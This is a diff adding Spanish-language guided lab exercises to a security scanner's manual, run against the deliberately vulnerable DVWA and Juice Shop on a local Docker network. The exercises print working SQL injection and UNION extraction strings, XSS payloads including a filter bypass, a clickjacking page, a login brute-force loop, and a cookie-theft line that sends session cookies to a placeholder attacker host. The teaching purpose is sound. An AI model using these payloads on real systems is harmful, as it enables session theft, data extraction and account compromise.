@@ -19,6 +19,7 @@
 9. [Base de conocimiento CVE](#9-base-de-conocimiento-cve)
 10. [Solución de problemas](#10-solución-de-problemas)
 11. [Referencia rápida](#11-referencia-rápida)
+12. [Ejercicios prácticos guiados](#12-ejercicios-prácticos-guiados)
 
 ---
 
@@ -507,6 +508,650 @@ make help               # Listar todos los comandos disponibles
 |---------|---------|-----------|
 | DVWA | `admin` | `password` |
 | Juice Shop | Registrar cuenta nueva en /#/register | — |
+
+---
+
+---
+
+## 12. Ejercicios prácticos guiados
+
+Esta sección contiene ejercicios ejecutables paso a paso. Todos los comandos funcionan con el laboratorio arriba (`make lab-start`). El flujo general de cada ejercicio es:
+
+```
+Escanear → Leer reporte → Verificar manualmente → Entender el riesgo
+```
+
+> **Antes de empezar:** verifica que el lab esté corriendo con `make lab-status`. Todos los contenedores deben estar `Up`.
+
+---
+
+### Ejercicio 1 — Mi primer escaneo (10 min)
+
+**Objetivo:** ejecutar el primer escaneo y familiarizarse con la salida.  
+**OWASP:** A05 Security Misconfiguration, A07 Identification and Authentication Failures
+
+#### Paso 1 — Lanzar el escaneo
+
+```bash
+make lab-scan-juice
+```
+
+O con Docker directamente:
+
+```bash
+docker run --rm --network scan-agent-network \
+  scan-agent:3.0.0 \
+  --scan --target juice-shop:3000 --profile lab
+```
+
+#### Paso 2 — Qué observar en la salida
+
+Mientras corre, verás las fases del pipeline:
+
+```
+FASE 0: EJECUCIÓN DE ESCANEO
+  [1/2] Ejecutando nmap...   ✅ Completado en 1.2s
+  [2/2] Ejecutando curl...   ✅ Completado en 0.1s
+
+FASE 1: PARSING DE ARCHIVOS
+  [OK] Parseado: headers_juice-shop:3000.txt - 15 headers encontrados
+
+FASE 2: ANÁLISIS E INTERPRETACIÓN
+  [EDU] 12 vulnerabilidades enriquecidas con datos educativos
+  Vulnerabilidades totales: 18
+
+FASE 3: GENERACIÓN DE INFORMES
+  [OK] Informe HTML generado: informe_tecnico.html
+```
+
+#### Paso 3 — Verificar manualmente los headers detectados
+
+Scan Agent detectará que Juice Shop tiene headers de seguridad faltantes. Confírmalo tú mismo:
+
+```bash
+# Desde tu máquina (fuera de Docker)
+curl -I http://localhost:3000
+```
+
+Salida esperada — nota los headers que **faltan**:
+
+```http
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: text/html; charset=utf-8
+# ← NO hay X-Frame-Options
+# ← NO hay Content-Security-Policy
+# ← NO hay Strict-Transport-Security
+```
+
+Compara con un servidor bien configurado que sí los tendría.
+
+---
+
+### Ejercicio 2 — Leer el informe educativo (15 min)
+
+**Objetivo:** usar el formato `educational` para entender por qué cada vulnerabilidad es peligrosa.  
+**OWASP:** todas las categorías detectadas en el escaneo anterior
+
+#### Paso 1 — Generar el informe educativo
+
+```bash
+docker run --rm --network scan-agent-network \
+  scan-agent:3.0.0 \
+  --scan --target juice-shop:3000 --profile lab --format educational
+```
+
+El archivo generado se llama `informe_educativo.html` en el directorio de trabajo del contenedor. Para abrirlo en tu máquina, copia el archivo o usa la Web UI (http://localhost:8080) que lo entrega como descarga.
+
+#### Paso 2 — Navegar las tarjetas
+
+Cada tarjeta en el informe educativo tiene tres secciones expandibles. Haz clic en la primera vulnerabilidad que encuentres:
+
+| Sección | Qué muestra |
+|---------|-------------|
+| ⚠️ ¿Por qué es peligroso? | Consecuencia real en producción |
+| 🔍 Ejemplo de ataque | Payload o script concreto |
+| 🛠️ Cómo remediarlo | Código de configuración correcto |
+
+#### Paso 3 — Discusión en clase
+
+Para cada vulnerabilidad que encuentres, responde:
+1. ¿Qué dato o funcionalidad quedaría expuesto?
+2. ¿El ejemplo de ataque del reporte es automático o requiere interacción del usuario?
+3. ¿La remediación se haría en el servidor, el código, o la configuración?
+
+---
+
+### Ejercicio 3 — Headers de seguridad HTTP (20 min)
+
+**Objetivo:** detectar, confirmar y entender los headers de seguridad HTTP faltantes.  
+**OWASP:** A05:2021 — Security Misconfiguration  
+**CWE:** CWE-693 — Protection Mechanism Failure
+
+#### Paso 1 — Comparar Juice Shop vs un sitio bien configurado
+
+```bash
+# Headers de Juice Shop (inseguro):
+curl -I http://localhost:3000 2>/dev/null | grep -E "^(X-Frame|Content-Security|Strict-Transport|X-Content-Type|Referrer)"
+
+# Headers de example.com como referencia (abre en navegador o con curl):
+curl -I https://example.com 2>/dev/null | grep -E "^(X-Frame|Content-Security|Strict-Transport|X-Content-Type|Referrer)"
+```
+
+En Juice Shop no deberías ver ningún resultado — ningún header de seguridad está configurado.
+
+#### Paso 2 — Simular un ataque de clickjacking
+
+Crea un archivo `clickjack_test.html` en tu máquina con este contenido:
+
+```html
+<!DOCTYPE html>
+<html>
+<body style="background:#fff; font-family:sans-serif; padding:50px">
+  <h2>¿Ves el botón "Ganar un iPhone"? Haz clic en él.</h2>
+  <div style="position:relative; width:400px; height:400px">
+    <!-- El iframe "invisible" de Juice Shop encima del botón falso -->
+    <iframe src="http://localhost:3000/#/login"
+            style="opacity:0.0; position:absolute; top:0; left:0;
+                   width:400px; height:400px; z-index:2; border:none">
+    </iframe>
+    <!-- Botón visible que el usuario cree que hace clic -->
+    <button style="position:absolute; top:180px; left:100px;
+                   padding:15px 30px; font-size:1.2em; z-index:1;
+                   background:#28a745; color:white; border:none; border-radius:5px">
+      🎁 Ganar un iPhone
+    </button>
+  </div>
+  <p style="color:#666; font-size:0.85em">
+    (Sube la opacidad del iframe a 0.3 para ver el efecto real)
+  </p>
+</body>
+</html>
+```
+
+Abre el archivo en tu navegador y cambia `opacity:0.0` a `opacity:0.3` para ver Juice Shop superpuesto al botón falso. Así funciona un clickjacking.
+
+> **Si Juice Shop tuviera** `X-Frame-Options: DENY`, el iframe simplemente no cargaría — el ataque sería imposible.
+
+#### Paso 3 — Ejecutar el escaneo y comparar
+
+```bash
+# Escaneo enfocado en headers
+docker run --rm --network scan-agent-network \
+  scan-agent:3.0.0 \
+  --scan --target juice-shop:3000 --profile quick
+```
+
+Busca en la salida la línea `missing_security_headers` — confirmará los headers detectados automáticamente por la herramienta.
+
+---
+
+### Ejercicio 4 — SQL Injection en DVWA (25 min)
+
+**Objetivo:** escanear DVWA, detectar SQL Injection, verificarla manualmente y entender el impacto.  
+**OWASP:** A03:2021 — Injection  
+**CWE:** CWE-89 — Improper Neutralization of Special Elements in SQL Commands  
+**Requisito:** DVWA configurado (ver sección 2, Paso 4)
+
+#### Paso 1 — Configurar DVWA en nivel Low (más vulnerable)
+
+1. Ve a http://localhost:8081/security.php
+2. Cambia "Security Level" a **Low**
+3. Haz clic en **Submit**
+
+#### Paso 2 — Escanear DVWA
+
+```bash
+docker run --rm --network scan-agent-network \
+  scan-agent:3.0.0 \
+  --scan --target dvwa:80 --profile web
+```
+
+#### Paso 3 — Verificar SQL Injection manualmente
+
+Ve a http://localhost:8081/vulnerabilities/sqli/ y en el campo "User ID" prueba estos inputs:
+
+```
+# Input 1 — ID normal (comportamiento esperado):
+1
+
+# Input 2 — comilla simple (intento de escape):
+1'
+
+# Input 3 — bypass de autenticación clásico:
+1' OR '1'='1
+
+# Input 4 — extraer todos los usuarios:
+1' OR '1'='1' --
+```
+
+Con el input 3 o 4 deberías ver todos los usuarios de la base de datos. La consulta vulnerable que hay detrás es:
+
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '$id';
+-- Con input "1' OR '1'='1" se convierte en:
+SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
+-- La condición OR '1'='1' siempre es verdadera → devuelve todos los registros
+```
+
+#### Paso 4 — Entender el impacto
+
+Ahora intenta extraer la versión de la base de datos (información de reconocimiento):
+
+```
+1' UNION SELECT null, version() --
+```
+
+Y las tablas existentes (enumeración):
+
+```
+1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() --
+```
+
+> Anota qué información pudiste extraer. ¿Qué pasaría si esta base de datos tuviera datos de clientes, contraseñas o tarjetas de crédito?
+
+#### Paso 5 — Ver el nivel de protección (Medium y High)
+
+Cambia el nivel de seguridad en http://localhost:8081/security.php a **Medium** y repite el input `1' OR '1'='1`. Observa cómo DVWA intenta sanitizar la entrada (pero sigue siendo vulnerable con otro enfoque). Luego prueba **High**.
+
+---
+
+### Ejercicio 5 — Cross-Site Scripting (XSS) en DVWA (20 min)
+
+**Objetivo:** detectar XSS reflejado, ejecutarlo en el navegador y ver el impacto en sesiones.  
+**OWASP:** A03:2021 — Injection  
+**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation
+
+#### Paso 1 — XSS reflejado (nivel Low)
+
+Ve a http://localhost:8081/vulnerabilities/xss_r/ y en el campo "What's your name?" introduce:
+
+```html
+<script>alert('XSS ejecutado')</script>
+```
+
+Debes ver un pop-up con el mensaje "XSS ejecutado". El navegador ejecutó el código JavaScript que tú introdujiste.
+
+#### Paso 2 — Robo simulado de cookie de sesión
+
+Introduce este payload en el mismo campo:
+
+```html
+<script>alert('Tu cookie: ' + document.cookie)</script>
+```
+
+Verás tu `PHPSESSID` en el pop-up. En un ataque real, el atacante enviaría esa cookie a su servidor:
+
+```html
+<script>
+  new Image().src = 'http://atacante.com/steal?c=' + document.cookie;
+</script>
+```
+
+> Con esa cookie, el atacante puede iniciar sesión como tú sin necesitar tu contraseña.
+
+#### Paso 3 — XSS almacenado (persistente)
+
+Ve a http://localhost:8081/vulnerabilities/xss_s/ — este tipo es más peligroso porque el payload queda guardado en la base de datos y afecta a todos los usuarios que visiten la página.
+
+En el campo "Message" introduce:
+
+```html
+<script>document.body.style.background='red'</script>
+```
+
+Recarga la página — el fondo seguirá rojo para cualquier usuario que la abra.
+
+#### Paso 4 — Comparar con nivel Medium
+
+Cambia a nivel Medium e intenta el mismo `<script>alert(1)</script>`. Observa que DVWA filtra `<script>` pero puedes bypasearlo con:
+
+```html
+<img src=x onerror="alert('XSS con img')">
+```
+
+Esto ilustra que los filtros simples de texto no son suficientes — hay decenas de vectores XSS posibles.
+
+---
+
+### Ejercicio 6 — OWASP API Security Top 10 en Juice Shop (30 min)
+
+**Objetivo:** ejecutar el perfil `api-owasp` y analizar vulnerabilidades específicas de APIs REST.  
+**OWASP API:** API1 (BOLA), API2 (Broken Auth), API4 (Rate Limiting), API8 (Misconfiguration)
+
+#### Paso 1 — Escaneo API
+
+```bash
+docker run --rm --network scan-agent-network \
+  scan-agent:3.0.0 \
+  --scan --target juice-shop:3000 --profile api-owasp
+```
+
+El escaneo tarda unos 10-15 minutos porque prueba activamente los 10 controles.
+
+#### Paso 2 — Verificar BOLA/IDOR manualmente (API1:2023)
+
+Juice Shop tiene una API REST en `http://localhost:3000/api/`. Prueba acceder a pedidos de otros usuarios:
+
+```bash
+# Primero registra una cuenta en http://localhost:3000/#/register
+# Luego inicia sesión y captura tu token JWT con las DevTools (Network tab)
+
+# Con tu token, intenta acceder a pedidos con diferentes IDs:
+TOKEN="tu_jwt_aqui"
+
+curl -s -H "Authorization: Bearer $TOKEN" \
+  http://localhost:3000/api/Orders/1 | python3 -m json.tool
+
+curl -s -H "Authorization: Bearer $TOKEN" \
+  http://localhost:3000/api/Orders/2 | python3 -m json.tool
+
+curl -s -H "Authorization: Bearer $TOKEN" \
+  http://localhost:3000/api/Orders/3 | python3 -m json.tool
+```
+
+Si alguno responde datos de un pedido que no es tuyo → BOLA confirmado.
+
+#### Paso 3 — Verificar rate limiting (API4:2023)
+
+```bash
+# Script para probar si hay rate limiting en el login
+for i in $(seq 1 10); do
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+    -X POST http://localhost:3000/api/Users/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"test@test.com","password":"wrongpass"}')
+  echo "Intento $i: HTTP $STATUS"
+done
+```
+
+Si todos los intentos responden `401` sin bloquearse ni añadir delay → no hay rate limiting. En una API real, el endpoint debería responder `429 Too Many Requests` después de 3-5 intentos.
+
+#### Paso 4 — Verificar documentación expuesta (API8:2023)
+
+```bash
+# Swagger/OpenAPI expuesto sin autenticación
+curl -s http://localhost:3000/api-docs | python3 -m json.tool | head -40
+```
+
+Si responde con la definición OpenAPI → documentación de la API accesible públicamente sin auth. Esto revela todos los endpoints, parámetros y tipos de datos.
+
+---
+
+### Ejercicio 7 — Escaneo pasivo con OWASP ZAP (15 min)
+
+**Objetivo:** usar ZAP para hacer spider + escaneo pasivo y comparar con los resultados del perfil `lab`.  
+**Requisito:** laboratorio completo con ZAP arriba (`docker compose --profile lab up -d`)
+
+#### Paso 1 — Verificar que ZAP está corriendo
+
+```bash
+curl -s "http://localhost:8090/JSON/core/view/version/?apikey=zap-scan-agent-lab" | python3 -m json.tool
+```
+
+Respuesta esperada:
+```json
+{
+  "version": "2.15.0"
+}
+```
+
+#### Paso 2 — Escaneo pasivo ZAP
+
+```bash
+docker run --rm --network scan-agent-network \
+  -e ZAP_HOST=zap -e ZAP_PORT=8090 -e ZAP_API_KEY=zap-scan-agent-lab \
+  scan-agent:3.0.0 \
+  --scan --target juice-shop:3000 --profile zap-passive
+```
+
+Observa en la salida la progresión del spider:
+
+```
+[ZAP] Spider: 0%
+[ZAP] Spider: 67%
+[ZAP] Spider: 100%
+[ZAP] Escaneo pasivo: 0 registros pendientes
+[ZAP] Alertas: 278 total | High=0 Medium=129 Low=99 Informational=50
+```
+
+#### Paso 3 — Comparar perfiles
+
+Ejecuta los tres perfiles sobre Juice Shop y anota los resultados:
+
+| Perfil | Vuln. detectadas | Tiempo | Herramienta principal |
+|--------|-----------------|--------|----------------------|
+| `quick` | ? | ? | nmap |
+| `lab` | ? | ? | nmap + curl + gobuster |
+| `zap-passive` | ? | ? | OWASP ZAP |
+
+> ¿Qué perfil detecta más vulnerabilidades? ¿Cuál es más rápido? ¿Qué detecta ZAP que los otros no?
+
+#### Paso 4 — Inspeccionar las alertas ZAP directamente
+
+```bash
+# Ver las alertas de riesgo medio detectadas por ZAP
+curl -s "http://localhost:8090/JSON/core/view/alerts/?baseurl=http://juice-shop:3000&riskid=2&apikey=zap-scan-agent-lab" \
+  | python3 -c "
+import json, sys
+data = json.load(sys.stdin)
+alerts = data.get('alerts', [])
+print(f'Total alertas MEDIUM: {len(alerts)}')
+for a in alerts[:5]:
+    print(f'  - {a[\"name\"]}: {a[\"url\"][:60]}')
+"
+```
+
+---
+
+### Ejercicio 8 — API REST de Scan Agent (15 min)
+
+**Objetivo:** explorar y usar la API REST de Scan Agent directamente (sin interfaz web).  
+**Herramienta:** Swagger UI en http://localhost:8080/api/docs
+
+#### Paso 1 — Ver los endpoints disponibles
+
+Abre http://localhost:8080/api/docs en el navegador. Verás los endpoints organizados por categoría:
+
+- `POST /api/scans/` — iniciar un escaneo
+- `GET /api/scans/` — listar todos los escaneos
+- `GET /api/scans/{scan_id}` — ver estado de un escaneo
+- `GET /api/scans/{scan_id}/report` — descargar reporte
+
+#### Paso 2 — Lanzar un escaneo via API con curl
+
+```bash
+# Iniciar escaneo de Juice Shop
+SCAN_RESPONSE=$(curl -s -X POST http://localhost:8080/api/scans/ \
+  -H "Content-Type: application/json" \
+  -d '{
+    "target": "juice-shop",
+    "profile": "quick",
+    "description": "Escaneo via API - ejercicio 8"
+  }')
+
+echo "$SCAN_RESPONSE" | python3 -m json.tool
+
+# Guardar el scan_id para los siguientes pasos
+SCAN_ID=$(echo "$SCAN_RESPONSE" | python3 -c "import json,sys; print(json.load(sys.stdin)['scan_id'])")
+echo "Scan ID: $SCAN_ID"
+```
+
+#### Paso 3 — Monitorear el estado en tiempo real
+
+```bash
+# Consultar estado cada 5 segundos hasta que termine
+while true; do
+  STATUS=$(curl -s "http://localhost:8080/api/scans/$SCAN_ID" | python3 -c "
+import json, sys
+d = json.load(sys.stdin)
+print(f'Estado: {d[\"status\"]} | Vulns: {d.get(\"total_vulnerabilities\", \"...\")}')")
+  echo "$STATUS"
+  if [[ "$STATUS" == *"completed"* ]]; then break; fi
+  sleep 5
+done
+```
+
+#### Paso 4 — Descargar el reporte en JSON
+
+```bash
+curl -s "http://localhost:8080/api/scans/$SCAN_ID/report?format=json" \
+  | python3 -c "
+import json, sys
+data = json.load(sys.stdin)
+vulns = data.get('vulnerabilities', [])
+print(f'Total vulnerabilidades: {len(vulns)}')
+print()
+for v in sorted(vulns, key=lambda x: x.get('cvss_score',0), reverse=True)[:5]:
+    print(f'  [{v[\"severidad\"].upper():8s}] CVSS {v[\"cvss_score\"]} — {v[\"titulo\"][:50]}')
+"
+```
+
+---
+
+### Ejercicio 9 — Ciclo completo: detectar, verificar, entender (40 min)
+
+**Objetivo:** recorrer el ciclo completo de un pentest educativo: escanear → confirmar hallazgo → documentar el riesgo.  
+**Formato:** trabajo individual o en pareja
+
+#### Paso 1 — Escaneo inicial de referencia
+
+```bash
+# Escaneo completo con todos los formatos
+docker run --rm --network scan-agent-network \
+  scan-agent:3.0.0 \
+  --scan --target juice-shop:3000 --profile lab --format all
+```
+
+Anota los conteos de severidad del resultado.
+
+#### Paso 2 — Elegir una vulnerabilidad para investigar
+
+Del reporte generado, elige una vulnerabilidad de severidad **media** o **alta** y completa esta ficha:
+
+```
+FICHA DE VULNERABILIDAD
+═══════════════════════════════════════════════
+Nombre:         [copia del reporte]
+Categoría OWASP: [copia del reporte]
+CWE:            [copia del reporte]
+CVSS Score:     [copia del reporte]
+
+¿Cómo la confirmé manualmente?
+  [describe los pasos que hiciste en el navegador / con curl]
+
+¿Qué impacto tendría en una aplicación real?
+  [consecuencia para el usuario final o la empresa]
+
+¿Cómo se remedía?
+  [copia del informe educativo o escribe con tus palabras]
+═══════════════════════════════════════════════
+```
+
+#### Paso 3 — Confirmar el hallazgo manualmente
+
+Dependiendo del tipo de hallazgo, usa una de estas técnicas:
+
+**Para headers HTTP faltantes:**
+```bash
+curl -I http://localhost:3000 | grep -i "x-frame\|csp\|hsts\|x-content"
+# Si no aparece nada → confirmado
+```
+
+**Para información de versiones expuesta:**
+```bash
+curl -I http://localhost:3000 | grep -i "x-powered-by\|server:"
+```
+
+**Para CORS abierto:**
+```bash
+curl -I -H "Origin: https://evil.com" http://localhost:3000/api/Users/login \
+  | grep -i "access-control"
+# Si responde Access-Control-Allow-Origin: * → CORS demasiado permisivo
+```
+
+**Para endpoints sin autenticación:**
+```bash
+# Intenta acceder a la API de administración sin token
+curl -s http://localhost:3000/api/Users/ | python3 -m json.tool | head -20
+# Si devuelve datos → endpoint sin auth
+```
+
+#### Paso 4 — Segundo escaneo (comparación)
+
+Después de documentar los hallazgos, ejecuta un segundo escaneo idéntico:
+
+```bash
+docker run --rm --network scan-agent-network \
+  scan-agent:3.0.0 \
+  --scan --target juice-shop:3000 --profile lab
+```
+
+Abre el dashboard en http://localhost:8080 — verás el widget de comparación entre los dos escaneos mostrando si el número de vulnerabilidades cambió.
+
+> En este ejercicio las vulnerabilidades serán las mismas porque no modificamos Juice Shop. Pero en un proyecto real, aquí es donde verías el progreso después de aplicar correcciones.
+
+---
+
+### Ejercicio 10 — Escanear tu propia aplicación (opcional, avanzado)
+
+**Objetivo:** aplicar Scan Agent a una aplicación propia que estés desarrollando.  
+**Requisito:** tu aplicación debe estar corriendo en Docker en la misma red, o tener una IP accesible.
+
+#### Opción A — Agregar tu app a la red del lab
+
+Si tu aplicación corre en Docker, agrégala a la red del lab:
+
+```bash
+# Conectar un contenedor existente a la red del lab
+docker network connect scan-agent-network nombre_de_tu_contenedor
+```
+
+Luego escanea por nombre de contenedor:
+
+```bash
+docker run --rm --network scan-agent-network \
+  scan-agent:3.0.0 \
+  --scan --target nombre_de_tu_contenedor:PUERTO --profile web
+```
+
+#### Opción B — Escanear por IP local
+
+```bash
+# En Windows: ipconfig → buscar la IP de la interfaz "vEthernet (WSL)" o similar
+# En Linux/Mac: ip addr o ifconfig
+
+docker run --rm --network scan-agent-network \
+  scan-agent:3.0.0 \
+  --scan --target TU_IP:PUERTO --profile quick
+```
+
+#### Qué buscar en tu aplicación
+
+| Área | Qué verificar |
+|------|--------------|
+| Headers HTTP | ¿Están configurados X-Frame-Options, CSP, HSTS? |
+| Endpoints | ¿Hay rutas sin autenticación que deberían estar protegidas? |
+| Versiones | ¿El servidor revela versión de framework o lenguaje? |
+| CORS | ¿El Access-Control-Allow-Origin es restrictivo? |
+| Errores | ¿Los errores muestran stack traces o rutas internas? |
+
+---
+
+### Resumen de ejercicios
+
+| # | Ejercicio | OWASP | Tiempo | Dificultad |
+|---|-----------|-------|--------|-----------|
+| 1 | Primer escaneo | A05 | 10 min | ⬤○○ Básico |
+| 2 | Informe educativo | múltiple | 15 min | ⬤○○ Básico |
+| 3 | Headers HTTP + clickjacking | A05 | 20 min | ⬤⬤○ Intermedio |
+| 4 | SQL Injection en DVWA | A03 | 25 min | ⬤⬤○ Intermedio |
+| 5 | XSS en DVWA | A03 | 20 min | ⬤⬤○ Intermedio |
+| 6 | OWASP API Top 10 en Juice Shop | API1/4/8 | 30 min | ⬤⬤⬤ Avanzado |
+| 7 | Escaneo ZAP pasivo | múltiple | 15 min | ⬤⬤○ Intermedio |
+| 8 | API REST de Scan Agent | — | 15 min | ⬤⬤○ Intermedio |
+| 9 | Ciclo completo detectar-verificar | múltiple | 40 min | ⬤⬤⬤ Avanzado |
+| 10 | Tu propia aplicación | múltiple | variable | ⬤⬤⬤ Avanzado |
 
 ---
 
